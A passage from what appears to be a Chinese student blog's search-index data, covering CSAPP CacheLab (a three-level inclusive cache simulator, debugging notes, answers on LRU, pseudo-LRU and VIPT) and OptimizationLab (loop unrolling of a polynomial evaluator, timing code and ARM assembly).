line结构中的latest_used字段\n在evict一条cache line时，你需要考虑dirty字段的影响，换句话说，如果dirty为true，你需要在加载新的cache line之前，将旧的cache line写回到下一级cache（或内存）。如果dirty为false，你可以简单的将这条cache line丢弃\n你在进行evict的时候，无需对evict的cache line的LRU字段进行改动\n你需要在每次成功访问一条cache line之后设置LRU字段，成功访问指写入/读取命中，或者是从下级缓存加载了相应的cache line之后的读取/写入操作\n在发生conflict miss时，你需要严格遵守先fetch，后evict的过程，即先访问下一级缓存或者内存得到数据所在的cache line，再选择需要evict的cache line，这可能会影响LRU设置的顺序。考虑一个例子，假如某个时刻全局时钟为10，L1发生conflict miss，L2 hit，你需要首先访问L2，由于L2 hit，设置L2中对应的cache line的LRU为10，然后将cache line返回给L1，假设L1需要evict的cache line是dirty的，你需要将其首先写回L2，这是100% hit的（为什么？），因此设置L2中对应的cache line的LRU为11，最后将需要的cache line放置在L1经evict空出的位置上，然后设置对应的LRU为12\n本次实验要求上一级cache的内容一定存在于下一级cache中，这叫做inclusive policy。你需要时刻保证这一条性质，并且好好利用它\n受限于inclusive policy，写回脏数据的过程实际上是100% hit的，你需要合理的安排代码顺序实现这一点\n当你处理write miss时，需要首先访问下一级缓存（或者内存）获取cache line，然后再写入这条cache line。在此过程中，你需要仔细思考对于下一级缓存应该以什么类型进行访问\n如果你需要从L2 evict某个cache line，假设这个cache line也存在于L1, 你需要将L1中对应的cache line也进行evict，这个过程叫做back invalidation。如果L1中的数据是dirty的，你需要首先将其写回L2。\n如果你需要从L3 evict一个cache line，你也需要分别将L1和L2中对应的cache line进行evict。在此过程中，你需要好好思考evict的顺序，以保证inclusive的性质。\n注意，不同级别的缓存cache line的大小可能是不一样，你在设计代码的时候需要考虑这会产生哪些影响，并仔细的处理相关流程\nvscode ctrl + shift + I整理代码\n我草，debug快疯了\u0026hellip;\u0026hellip;（debug日记）\n//分析一下错误 Testcase Lines Result Random Score --------------------------------------------------------------------------------- traces-data-intensive/long.trace 267988 FAIL IGNORE 0/3 Details for trace \u0026lt;traces-data-intensive/long.trace\u0026gt; Your simulator Reference simulator Level Hits Misses Evicts Hits Misses Evicts L1 D 231249 55715 53833 230444 56520 53285 L1 I 0 0 0 0 0 0 L2 46998 26645 26424 47391 27797 24629 L3 32061 10181 10053 33435 11645 11517 hits 和 misses的和相等，但是差刚好差了805,hits多了，misses少了，随之evict也会变多，这应该不是计数而是逻辑的问题\nraces-basic/mixed-2.trace 90 FAIL IGNORE 0/5 Details for trace \u0026lt;traces-basic/mixed-2.trace\u0026gt; Your simulator Reference simulator Level Hits Misses Evicts Hits Misses Evicts L1 D 20 60 52 20 60 52 L1 I 18 12 7 17 13 6 L2 71 43 15 71 44 16 L3 19 28 0 21 28 0 为什么I指令自己没错，分开都没错，但是结合到一起就出错了,两者之间为什么会相互影响？？？\ntraces-hard/grep.trace 406467 FAIL IGNORE 0/1 Details for trace \u0026lt;traces-hard/grep.trace\u0026gt; Your simulator Reference simulator Level Hits Misses Evicts Hits Misses Evicts L1 D 37304 1068 949 22544 15828 502 L1 I 184075 184064 184034 184075 184064 184016 L2 176099 9087 9055 118023 81983 81951 L3 6693 2413 2285 79669 2416 2288 L3hits之间差距过大,L2中的数据没有及时驱逐？？？\n先放这，休息一下再看。\n已经拿了76分，但实在是很难找到剩下的逻辑错误！煎熬！\nOK，最后拿了93分，差一点点实在是找不出来为啥了,不贴源代码了，写了六七百行能跑的垃圾，之后再精简总结一下,这下是真尽力了，我感觉已经不是一个设计的问题了，到最后我甚至要去猜哪里的设计提示是不是说的有问题，有错误，那就没有意思了对么\u0026hellip;\u0026hellip;\n最后应该是因为三层地址中block位并不一样的原因，这里要细节处理一下，因为你直接把L3的block干成0,可能会对于L2的setIndex位产生影响。\n我不在这里放代码：\n1.我写的代码很垃圾，没有放的意义。\n2.维护学术诚信。\n关于Cache的一些思考 # 也不算很深，进一步探究一下，以下都是我自己或者问gpt得到的观点，自己的一些看法，如果您对于某个问题有着更好的理解，欢迎在评论区指出来，这里我说的低级cache或者下层的cache指的是靠近内存的cache。\n1.在这个实验中一直强调的一个点是Inclusive policy，这种设计方法在以前的CPU，特别是Intel的CPU中很常见，但其实现代的CPU以及逐渐转向使用NINE模式，因此会产生以下问题： # 使用Inclusive policy的缓存必须满足什么条件？这样设计的优缺点分别是什么？\n​\t底层缓存必须包含上层的缓存，在底层缓存驱逐的时候要做back invalidation。\n好处：\n​\t好判断，多核的时候很好知道高级缓存的内容是否存在于低级缓存之中。\n缺点：\n​\t冗余数据驱逐：L2 驱逐某数据时，即使 L1 正在频繁使用，也必须一并驱逐它，增加了不必要的 L1 miss。\n​\t容量浪费：为了维护包含关系，L2 的一些空间可能被迫用于保持与 L1 相同的数据，降低了有效利用率。\n​\t降低性能上限：高级缓存未能成为真正的“补充层”，而是受限于 L1 的命中内容。\nNINE策略不要求低级cache强制包含高级cache内容，这样做相比inclusive的好处和坏处分别是什么？\n​\t（NINE：Non-Inclusive, Non-Exclusive）\n​\tNINE就是说下层的cache和上层的cache，二者之间不要求下层cache一定要包含上层cache的内容，同时也不要求两层cache之间的内容一定要是相互排斥的。\n好处：\n​\t减少了数据冗余，提高了缓存的利用率，当下层的cache要被驱逐的时候，不会影响上层的cache，从而导致没有必要的cache miss。\n缺点：\n​\t我很难保证一致性的问题，并且数据的管理相对复杂（NINE就是在包含性和排他性策略之间的一种状态），比如说我在L2 cache hit了之后，决定到底要不要把这个数据加载到L1中去之后干掉L2,包含性就是不能干掉，排他性就是必须干掉。\n本次实验实际上借助inclusive的性质大大简化了设计，如果采用NINE结构，你将如何调整你的代码？\n​\t首先去除back invalidation的这部分逻辑，其次和上一个问题一样，我要设置premote下层cacheline的一个逻辑。\n2.现代CPU几乎都采用L1D和L1I两种缓存结构，而在L2及更低级的缓存使用统一指令和数据的方式，这么做的好处是什么？ # 以下是gpt的回答（我觉得写的还好，是否合理我也就不算很清楚了）：\n✅ 为什么 L1 要分成 L1D 和 L1I？\n➕ 好处一：提高访问带宽（并行性）\nCPU 在每个周期通常同时需要取指（fetch instruction）和访问数据。 如果 L1 是 unified 的，指令和数据会争用同一个缓存端口（cache port）。 分离 L1I 和 L1D 后，CPU 能 同时读取指令和访问数据，实现并发访问，提升执行效率。 ➕ 好处二：降低访问延迟（latency）\nL1 是最靠近执行核心的缓存，需要尽可能小而快。 分开管理指令和数据，可以让 L1I 和 L1D 各自做更有针对性的优化，例如： L1I 可以预取、预测分支； L1D 可以更好地处理 load/store、写缓冲等。 ➕ 好处三：避免污染和干扰\n指令和数据的访问模式差异很大： 指令访问具有更强的顺序性、局部性好； 数据访问则可能跳跃、随机、重复读取。 分开缓存避免了数据污染指令缓存（或反之），提升命中率和稳定性。 ✅ 为什么 L2/L3 使用 unified cache？\n➕ 原因一：提高缓存利用率\nL2/L3 体积更大（通常是几百 KB 到几十 MB）。 如果分为 I-cache 和 D-cache，则可能出现： L2D 已满但 L2I 还有空闲空间（或反之）； 导致资源浪费。 Unified cache 可以动态地根据访问需求分配空间，更灵活。 ➕ 原因二：简化设计，节省成本\nL2/L3 远离核心，访问延迟更高，并发访问不再是瓶颈。 统一设计结构更简单，不需要分别维护 tag、替换策略等逻辑。 ➕ 原因三：有助于 cache coherence 协议的实现\n多核共享的 L3 cache 使用统一结构更方便跟踪、标记和通信，便于维护一致性。 3.你觉得CPU是如何区分指令内存和数据内存的访问的？ # ​\t1.现代 CPU 内部有清晰划分的模块：\n取指单元（Instruction Fetch Unit） 专门负责取指令 加载/存储单元（Load/Store Unit） 专门负责读写数据 这两者访问内存的路径不同，进而访问不同的 Cache 层次结构（如 L1I vs. L1D）。\n​\t2.从软件视角来看：\n编译器把「执行代码」转成了存放在某段内存中的机器指令 把「变量数据」分配到另一块内存空间 于是，在 CPU 运行时：\n指令指针（PC / IP）发出的访问是“取指” 普通 Load/Store 指令发出的访问是“访问数据” ​\t也就是说根据发出指令的操作单元就可以说明这个指令究竟是I还是L指令。\n4.本次实验要求实现严格的LRU算法，一种暴力实现方式是遍历所有cache line, 这样时间复杂度为O（E），你可以设计一种复杂度为O（1）的实现方式吗？ # ​\t一道关于LRUCahce的lc，你应该能很好的理解为什么？https://leetcode.cn/problems/lru-cache/description/\n​\t这是实现的Java代码（我之前写过很多Java代码）\n//Least Recently Used //最近最少使用 //HashMap + DoublyLinkedList class LRUCache { //简单的双向链表 class Node{ int key; int val; Node prev; Node next; public Node(){} public Node(int _key, int _val){key = _key; val = _val;} } private Map\u0026lt;Integer, Node\u0026gt; cache; private int size; private int capacity; private Node head; private Node tail; //初始化缓存 public LRUCache(int capacity) { cache = new HashMap\u0026lt;\u0026gt;(); this.size = 0; this.capacity = capacity; head = new Node(); tail = new Node(); head.next = tail; tail.prev = head; } //相当于读取内存，读取成功这个值就返回value,并且放到双向链表的头部，否则返回-1（实际上要从内存中获取） public int get(int key) { if(cache.containsKey(key)){ moveToHead(cache.get(key)); return cache.get(key).val; } return -1; } //写值，道理类似 public void put(int key, int value) { if(cache.containsKey(key)){ Node node = cache.get(key); node.val = value; moveToHead(node); }else{ ++size; if(size \u0026gt; capacity){ --size; Node d = tail.prev; remove(d); cache.remove(d.key); } Node node = new Node(key, value); cache.put(key, node); add(node); } } //一旦get或者put，就放到head之后，作为最新的节点 private void moveToHead(Node node){ remove(node); add(node); } //一旦过容量，或者其他场景，删除节点 private void remove(Node node){ Node p = node.prev; Node n = node.next; p.next = n; n.prev = p; } //新put进来的元素，加到头节点之后 private void add(Node node){ Node n = head.next; head.next = node; node.prev = head; node.next = n; n.prev = node; } } ​\t基本就是利用；双向链表和hashmap，这样当我们给出一个值，我可以根据这个值直接找到对应的cacheline和在linkedlist中对应的node，直接把这个node提前到head位置，那么这个节点就是最新的，tail之前的节点就是最老的。\n​\t虽然是O（1），但是实际的开销并不会小。\n5.LRU算法在某种特定的情形下会造成100% miss，你可以发现这种访问模式吗？ # ​\tLRU Thrashing（LRU抖动）\n​\t比如这样，你的L1cache现在只有一个set，三行line，我对于四个元素A B C D进行循环的访问，那么开始就会\n​\t依次加入 A B C\n​\t接着读取D miss 去除A 放置D\n​\t接着读取A miss 去除B 放置A\n​\t接着读取B miss 去除 C 放置B\n​\t\u0026hellip;\u0026hellip;\n​\t上面这样的情况就会100%miss。\n6.实际硬件中，实现LRU算法其实十分昂贵，因此大多数厂家采用近似LRU的方法，如果让你设计，你会如何设计这种算法？ # 来自于gpt，讲的并不好理解，可以看看https://en.wikipedia.org/wiki/Pseudo-LRU\n​\tPseudo-LRU (PLRU)\n实现：\n最常见的是 二叉树 PLRU（Binary Tree Pseudo LRU）： 适用于 4、8、16 路组相联 Cache。 维护一个“树状指针结构”，每个节点记录最近访问的是左还是右。 总共只需 E - 1 个 bit 就能表示选择哪条 line 替换。 原理图：\n(b1) / \\ (b2) (b3) / \\ / \\ A B C D 每个内部节点 0/1 表示最近访问的是哪一侧 选择替换线时，从根节点走向“最久未访问的方向” 举个例子：\nb0, b1, b2 是 3 个位（bit），分别控制走向哪个子树。 每个 bit 记录“最近使用的是哪一边”。 这些 bit 可以这样理解：\n如果 b0 = 0，表示最近访问的是左子树（A、B），因此优先替换右子树（C、D） 如果 b1 = 1，表示在左子树中，最近访问的是 B → 替换 A 如果 b2 = 0，表示在右子树中，最近访问的是 C → 替换 D 从根开始，按照 bit 的指示往“没被最近访问过”的方向走，直到到达一个叶子节点（就是要被替换的 cache line）。\n然后反过来，更新路径上的 bit，表示刚刚走过的那条路径是“最近访问过的”。\n假设当前：\nb0 = 0 → 上次用了左边（A 或 B） b1 = 1 → 上次用了 B b2 = 0 → 上次用了 C 替换时：\n从 b0 看 0 → 最近访问的是左边 → 应该替换右边 进入 b2，看 0 → 最近访问的是 C → 应该替换 D ✅ 所以选择替换 D\n然后把：\nb0 = 1（因为现在访问右边） b2 = 1（访问了 D） 优点：\n硬件实现简单，开销低 实际效果在很多场景下接近 LRU 缺点：\n并不是真正的最久未使用，有可能替换到常用块 7.本次实验中在实现上有个小细节是，在发生conflict miss时，我们总是先从下一级fetch数据，然后再判断是否需要evict，这样做的好处和不足是什么？如果上述两个操作的流程互换之后，带来的好处和坏处是什么？你可能需要综合考虑inclusive policy带来的影响。 # ​\t如果仅有一层cache和memory，那么先后顺序是无所谓的。\n​\t我们用两层Cache和memory来理解一下这个问题：\n​\tL1 L2 memory\n​\t现在我访问L1 miss，L1满了，直接把那个要放入位置的数据驱逐掉。\n​\t又访问L2 miss，L2满了，驱逐，此时要考虑back invalidation，如果L1包含，那么那行cacheline也要驱逐掉，但是此时back invalidation的cacheline，和L1时候就驱逐的cacheline有可能是一行cacheline，这是否造成了浪费。\n​\t现在再从memory取值放入L2,L1刚刚驱逐的位置。\n方案 优点 缺点 先 fetch 后 evict（实验采用） - 避免 Inclusive 引起的无意义 invalidate - 更稳定一致性 - 实现简单 - 延迟高 - 有时多余 fetch 先 evict 后 fetch - 可优化延迟 - 有可能并行处理 - 易与 Inclusive 冲突 - 需要额外状态管理 8.进行cache访问时，需要根据内存地址提取出tag，set等字段，而CPU产生的地址实际上都是虚拟地址，需要额外的机制转换成物理地址（详见虚拟内存章节）。因此，cache的设计实际上可以分成physical index和virtual index两种方式，即采用物理地址或者虚拟地址两种地址解析tag，set等内容，那么： # 使用physical index的cache的优缺点是什么？\n避免了别名的问题，要TLB转换，带来延迟。\n使用virtual index的cache的优缺点是什么？\n访问会变快，但是有别名的问题。\n你能不能设计一种方法综合利用上述两种方式各自的优势？\n不能（？）\n折中方案：VIPT（Virtual Index, Physical Tag） # 先用虚拟地址索引（提取 index），用物理地址比对（tag）\n优势： # 保留了虚拟访问的速度优势（用虚拟 index 找 set） 同时 用物理 tag 避免 alias 问题 是 现代 L1 Cache 的主流设计（只要满足 index bits 不跨 page boundary） 设计要点： # Page offset 不变，必须保证 index bits 落在 page offset 范围（否则访问前无法知道 index）。 比如： 页大小：4KB = 12 bits offset Index bits ≤ 12 Tag 用物理地址中除去 index + block offset 部分 学过一点Java多线程，但是还没有系统学过OS，多少能理解一下多线程的问题，到这里已经相当复杂了，我就不再纸上谈兵了。\n9.本次实验中实现的模拟器只能应对顺序访问，如果需要扩展你的模拟器以支持多个线程并发访问，你该如何调整现有的代码？ # ​\t每一组cacheset用mutex（互斥🔓），保证任何一个时刻，一个set最多仅有一个thread访问。\n​\t原子操作LRU等数据。\n如果您有更好的看法，欢迎在评论区直接指出！\n10.本次实验中不要求考虑多核之间的一致性问题，如果考虑多核之间一致性的问题，且L3作为多核之间的共享缓存，你该如何调整现有的代码？ # 11.在考虑多核之间cache一致性的前提下，如果需要将inclusive策略变成NINE策略，你需要如何改进现有的代码？ # ","date":"13 April 2025","externalUrl":null,"permalink":"/csapp/csappcachelab/","section":"","summary":"\u003ch1 class=\"relative group\"\u003eCSAPP:CacheLab \n    \u003cdiv id=\"csappcachelab\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#csappcachelab\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e本次lab分为A和B两部分，我先看情况做，并且会部分引用我校助教撰写的一些内容以及思考题，首先我们要熟悉一下Cache的工作原理，关于这一部分的内容，你也可以看我的ComputerOrgnization中的内容（写的不怎么样，你最好还是看课本，而且我还建议你做一下课本上的习题），A部分是实现一个3级Cache，实现的过程中我们应当会对Cache的工作原理更加熟悉，B部分是优化矩阵转置函数，我认为会教会我们什么是Cahce友好的代码。\u003c/p\u003e\n\u003cp\u003e注意：以下不会从零开始讲述Cache的知识，并且\u003cstrong\u003e不要抄袭，不要抄袭，不要抄袭\u003c/strong\u003e。\u003c/p\u003e\n\u003cp\u003eCache:计算机的世界无处不在的伟大思想\u0026hellip;\u0026hellip;\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e熟悉：\u003c/p\u003e","title":"CSAPP:CacheLab","type":"csapp"},{"content":" CSAPP:OptimizationLab # 本次实验我们来优化一段计算多项式值的代码，并且亲自测量其性能，希望能加深同学们对机器特定优化的理解，同时为同学们提供测量性能的经验。\n基本材料都引用于我校的CSAPP实验指导书页面。\n预习：\n我们先明确几个概念\nCPE # 处理一个数据元素要多少个时钟周期。\n比如上图，有一个函数对于一个数组的每个元素进行一些重复的操作，那么就可以计算每个元素消耗了多少时钟周期，这就是CPE。\n把数组长度n作为自变量，消耗的cycles作为因变量，那么就可以画出一条曲线，曲线的斜率就是CPE。\nLatency bound # 延迟受限\n如下，当存在数据依赖的时候，计算下一次结果时必须等待上一次计算完毕，这个时间没办法减少，就叫latency bound。\n那么CPE的下界就是一次浮点乘法运算的时间。\ndouble product(double a[], long n) { long i; double x = 1.0; for (i = 0; i \u0026lt; n; ++i) { x *= a[i]; } return x; } Throughput bound # 吞吐受限\n没有依赖的问题，单次进行的用时较短，但是用来并发处理的执行单元较少带来的下界。\n循环展开 # 要突破Latency bound到Throughput bound，就要消除数据依赖的问题。\n2*1展开 # 消除了分支预测，但是还有数据依赖。\nfor (i = 0; i \u0026lt; limit; i+=2) { x = (x OP d[i]) OP d[i+1]; } 2*1a展开 # 这样就使得依赖的路径变短。\nfor (i = 0; i \u0026lt; limit; i+=2) { x = x OP (d[i] OP d[i+1]); } 2*2展开 # 这里有两个累积乘积的变量，能让他们在两条流水线上执行。\nfor (i = 0; i \u0026lt; limit; i+=2) { x0 = x0 OP d[i]; x1 = x1 OP d[i+1]; } K*K展开 # 我们可以用这样比较夸张的展开手法，但是当你用的局部变量过多的时候，寄存器就不够用了，内存读写就会成为新的Bound。\ndouble product(double a[], long n) { long i; double acc1 = 1.0; double acc2 = 1.0; double acc3 = 1.0; double acc4 = 1.0; double acc5 = 1.0; double acc6 = 1.0; double acc7 = 1.0; double acc8 = 1.0; double acc9 = 1.0; double acc10 = 1.0; for (i = 0; i + 9 \u0026lt; n; i += 10) { acc1 *= a[i]; acc2 *= a[i + 1]; acc3 *= a[i + 2]; acc4 *= a[i + 3]; acc5 *= a[i + 4]; acc6 *= a[i + 5]; acc7 *= a[i + 6]; acc8 *= a[i + 7]; acc9 *= a[i + 8]; acc10 *= a[i + 9]; } acc1 *= acc2; acc3 *= acc4; acc5 *= acc6; acc7 *= acc8; acc9 *= acc10; acc1 *= acc3; acc5 *= acc7; for (; i \u0026lt; n; ++i) { acc9 *= a[i]; } return acc1 * acc5 * acc9; } PartA:性能测量实验 # void poly(const double a[], double x, long degree, double *result) { long i; double r = a[degree]; for (i = degree - 1; i \u0026gt;= 0; i--) { r = a[i] + r * x; } *result = r; } 这是用秦九韶算法实现了求一个函数在某个点处的值的功能。\n我想测量这个函数的CPE。\n我们能使用的函数有很多，最推荐的是clock_gettime，它可以精确到纳秒级（至少单位是纳秒级），并且可以选取不同的时钟源。\n注意：在测量这个函数用时多少的时候，最好在一开始首先执行一遍你要测量的函数，这样cache中会存放这些调用时要使用的数据，不会引发大量的cachemiss引入不必要的噪声。\n代码很简单：\nvoid measure_time(poly_func_t poly, const double a[], double x, long degree, double *time) { double result = 0; poly(a, x, degree, \u0026amp;result); struct timespec start, end; clock_gettime(CLOCK_MONOTONIC, \u0026amp;start); poly(a, x, degree, \u0026amp;result); clock_gettime(CLOCK_MONOTONIC, \u0026amp;end); (*time) = end.tv_nsec - start.tv_nsec; } PartB：代码优化实验 # 针对于上面的这个多项式算法，我们有什么优化的方法，我想大概也就是循环展开之类的，来试试看!\n我们的目的是要把这个函数的CPE降低到1。\n我们根据现有的代码进行了一个更改，对于原函数进行12*12的循环展开。\nvoid poly_optim(const double a[], double x, long degree, double *result) { // 此时和秦九公式已经没有关系了，我们想办法最快算出答案即可。 double acc[12]; double xpow[13]; // 记录系数 acc[0] = a[degree]; acc[1] = a[degree - 1]; acc[2] = a[degree - 2]; acc[3] = a[degree - 3]; acc[4] = a[degree - 4]; acc[5] = a[degree - 5]; acc[6] = a[degree - 6]; acc[7] = a[degree - 7]; acc[8] = a[degree - 8]; acc[9] = a[degree - 9]; acc[10] = a[degree - 10]; acc[11] = a[degree - 11]; // 使用x的哪些幂 xpow[2] = x * x; xpow[3] = xpow[2] * x; xpow[4] = xpow[3] * x; xpow[5] = xpow[4] * x; xpow[6] = xpow[5] * x; xpow[7] = xpow[6] * x; xpow[8] = xpow[7] * x; xpow[9] = xpow[8] * x; xpow[10] = xpow[9] * x; xpow[11] = xpow[10] * x; xpow[12] = xpow[6] * xpow[6]; // 从倒数12个开始向前进行累积 int index = degree - 12; // int index = degree - 10; while (index \u0026gt;= 11) { acc[0] = a[index] + acc[0] * xpow[12]; acc[1] = a[index - 1] + acc[1] * xpow[12]; acc[2] = a[index - 2] + acc[2] * xpow[12]; acc[3] = a[index - 3] + acc[3] * xpow[12]; acc[4] = a[index - 4] + acc[4] * xpow[12]; acc[5] = a[index - 5] + acc[5] * xpow[12]; acc[6] = a[index - 6] + acc[6] * xpow[12]; acc[7] = a[index - 7] + acc[7] * xpow[12]; acc[8] = a[index - 8] + acc[8] * xpow[12]; acc[9] = a[index - 9] + acc[9] * xpow[12]; acc[10] = a[index - 10] + acc[10] * xpow[12]; acc[11] = a[index - 11] + acc[11] * xpow[12]; index -= 12; } // 处理剩下没有计算到的部分 long remain = (degree + 1) % 12; long rest_index = remain; double remainValue = 0; while (rest_index \u0026gt; 0) { remainValue *= x; remainValue += a[rest_index - 1]; --rest_index; } //相当于是一种位移,先把他们之间分开 double remain1 = acc[0] * xpow[11]; double remain2 = acc[1] * xpow[10]; double remain3 = acc[2] * xpow[9]; double remain4 = acc[3] * xpow[8]; double remain5 = acc[4] * xpow[7]; double remain6 = acc[5] * xpow[6]; double remain7 = acc[6] * xpow[5]; double remain8 = acc[7] * xpow[4]; double remain9 = acc[8] * xpow[3]; double remain10 = acc[9] * xpow[2]; double remain11 = acc[10] * x + acc[11]; double mainPart = remain1 + remain2 + remain3 + remain4 + remain5 + remain6 + remain7 + remain8 + remain9 + remain10 + remain11; //接着整体向后移位 index = 0; //----------------------------------------------------------------------------------------------------------- // //\t这里我有一个惨痛的教训： //\t我一开始很长时间把下边循环的限制量写成了rest_index,但是rest_index在上面早就减为0,循环不会再继续 //\t而这里对于答案造成的影响本来就非常非常小，导致我认为是上面的乘法和加法的精度上出了问题，于是浪费了很多时间在更改分块大小观察精度上 //\t直到最后才看到这里出了问题：写的代码再多，有时也会犯这样的错误 //\t1.务必起一个好的变量名，让人知道在干嘛，哪怕是简单的程序 //\t2.想清楚自己在写什么东西，如果是限制量，搞清楚它的大小 // //----------------------------------------------------------------------------------------------------------- while(index \u0026lt; remain){ mainPart *= x; ++index; } (*result) = remainValue + mainPart; } 思考问题： # 为什么这样更改这个函数的CPE就是1？我就是自己随便想一下，你可以把你的见解放在评论区，说实话我也想不清楚\u0026hellip;\u0026hellip;\n1.如果使用 poly() 同时计算多项式在两个x处的值，运行时间如何？14个值呢？需要计算 14 个值时，使用一次 poly() 同时计算快，还是调用14次 poly_optim() 快？\nvoid poly(const double a[], double x[], long degree, double result[], int n) { long i; double r[n]; memset(r, a[degree]); for (i = degree - 1; i \u0026gt;= 0; i--) { r[0] = a[i] + r[0] * x; r[1] = a[i] + r[1] * x; } for (int index = 0; index \u0026lt; n; ++index){ result[index] = r[index]; } } Q：可能是把参数作为一个数组传入poly()进行计算，在poly中传入一个x数组，还是只有一个循环的情况下，我们进行计算（大概就是上面这个意思），同时计算两个的时候，应该比调用两次poly计算更快，但没有解决依赖的问题。我觉得在degree比较高的时候，是否还是调用14次函数更快。\n2.为什么优化后的函数 CPE 是 1 而不是 0.5，性能瓶颈在哪里?\nQ：1.o对于这个函数来说是否已经是理论峰值？\n以下是优化生成的汇编代码：\n.arch armv8-a .file\t\u0026#34;poly.c\u0026#34; .text .align\t2 .global\tpoly_optim .type\tpoly_optim, %function poly_optim: .LFB0: .cfi_startproc stp\td8, d9, [sp, -64]! .cfi_def_cfa_offset 64 .cfi_offset 72, -64 .cfi_offset 73, -56 stp\td10, d11, [sp, 16] stp\td12, d13, [sp, 32] str\td14, [sp, 48] .cfi_offset 74, -48 .cfi_offset 75, -40 .cfi_offset 76, -32 .cfi_offset 77, -24 .cfi_offset 78, -16 mov\tx5, x0 ldr\td24, [x0, x1, lsl 3] add\tx0, x0, x1, lsl 3 ldr\td23, [x0, -8] ldr\td22, [x0, -16] ldr\td21, [x0, -24] ldr\td20, [x0, -32] ldr\td19, [x0, -40] ldr\td18, [x0, -48] ldr\td17, [x0, -56] ldr\td16, [x0, -64] ldr\td7, [x0, -72] ldr\td6, [x0, -80] ldr\td5, [x0, -88] ldr\td4, [x0, -96] ldr\td3, [x0, -104] ldr\td26, [x0, -112] fmul\td27, d0, d0 fmul\td28, d27, d0 fmul\td29, d28, d0 fmul\td30, d29, d0 fmul\td31, d30, d0 fmul\td8, d31, d0 fmul\td9, d8, d0 fmul\td10, d9, d0 fmul\td11, d10, d0 fmul\td12, d11, d0 fmul\td13, d12, d0 fmul\td14, d13, d0 fmul\td2, d14, d0 fmul\td1, d2, d0 sub\tw4, w1, #15 cmp\tw4, 13 ble\t.L2 add\tx3, x5, w4, sxtw 3 .L3: fmul\td24, d1, d24 ldr\td25, [x3] fadd\td24, d24, d25 fmul\td23, d1, d23 ldr\td25, [x3, -8] fadd\td23, d23, d25 fmul\td22, d1, d22 ldr\td25, [x3, -16] fadd\td22, d22, d25 fmul\td21, d1, d21 ldr\td25, [x3, -24] fadd\td21, d21, d25 fmul\td20, d1, d20 ldr\td25, [x3, -32] fadd\td20, d20, d25 fmul\td19, d1, d19 ldr\td25, [x3, -40] fadd\td19, d19, d25 fmul\td18, d1, d18 ldr\td25, [x3, -48] fadd\td18, d18, d25 fmul\td17, d1, d17 ldr\td25, [x3, -56] fadd\td17, d17, d25 fmul\td16, d1, d16 ldr\td25, [x3, -64] fadd\td16, d16, d25 fmul\td7, d1, d7 ldr\td25, [x3, -72] fadd\td7, d7, d25 fmul\td6, d1, d6 ldr\td25, [x3, -80] fadd\td6, d6, d25 fmul\td5, d1, d5 ldr\td25, [x3, -88] fadd\td5, d5, d25 fmul\td4, d1, d4 ldr\td25, [x3, -96] fadd\td4, d4, d25 fmul\td3, d1, d3 ldr\td25, [x3, -104] fadd\td3, d3, d25 fmul\td26, d1, d26 ldr\td25, [x3, -112] fadd\td26, d26, d25 sub\tw4, w4, #15 sub\tx3, x3, #120 cmp\tw4, 13 bgt\t.L3 .L2: add\tx3, x1, 1 mov\tx1, -8608480567731124088 movk\tx1, 0x8889, lsl 0 smulh\tx1, x3, x1 add\tx1, x1, x3 asr\tx1, x1, 3 sub\tx0, x1, x3, asr 63 lsl\tx1, x0, 4 sub\tx0, x1, x0 sub\tx0, x3, x0 cmp\tx0, 0 ble\t.L8 mov\tx1, x0 movi\td25, #0 sub\tx3, x5, #8 .L5: fmul\td25, d0, d25 ldr\td1, [x3, x1, lsl 3] fadd\td25, d25, d1 subs\tx1, x1, #1 bne\t.L5 .L4: fmul\td1, d2, d24 fmul\td14, d14, d23 fadd\td1, d1, d14 fmul\td13, d13, d22 fadd\td1, d1, d13 fmul\td12, d12, d21 fadd\td1, d1, d12 fmul\td11, d11, d20 fadd\td1, d1, d11 fmul\td10, d10, d19 fadd\td1, d1, d10 fmul\td9, d9, d18 fadd\td1, d1, d9 fmul\td8, d8, d17 fadd\td1, d1, d8 fmul\td31, d31, d16 fadd\td1, d1, d31 fmul\td30, d30, d7 fadd\td1, d1, d30 fmul\td29, d29, d6 fadd\td1, d1, d29 fmul\td28, d28, d5 fadd\td1, d1, d28 fmul\td27, d27, d4 fadd\td1, d1, d27 fmul\td3, d0, d3 fadd\td3, d3, d26 fadd\td1, d1, d3 cmp\tx0, 0 ble\t.L6 mov\tw1, 0 .L7: fmul\td1, d1, d0 add\tw1, w1, 1 cmp\tw1, w0 bne\t.L7 .L6: fadd\td25, d25, d1 str\td25, [x2] ldp\td10, d11, [sp, 16] ldp\td12, d13, [sp, 32] ldr\td14, [sp, 48] ldp\td8, d9, [sp], 64 .cfi_remember_state .cfi_restore 73 .cfi_restore 72 .cfi_restore 78 .cfi_restore 76 .cfi_restore 77 .cfi_restore 74 .cfi_restore 75 .cfi_def_cfa_offset 0 ret .L8: .cfi_restore_state movi\td25, #0 b\t.L4 .cfi_endproc .LFE0: .size\tpoly_optim, .-poly_optim .align\t2 .global\tmeasure_time .type\tmeasure_time, %function 全部都是寄存器操作已经避免了内存读写的开销，我们也没有更多的乘法处理单元？\n问题：SIMD化是什么？\n","date":"10 April 2025","externalUrl":null,"permalink":"/csapp/csappoptimizationlab/","section":"","summary":"\u003ch1 class=\"relative group\"\u003eCSAPP:OptimizationLab \n    \u003cdiv id=\"csappoptimizationlab\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#csappoptimizationlab\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    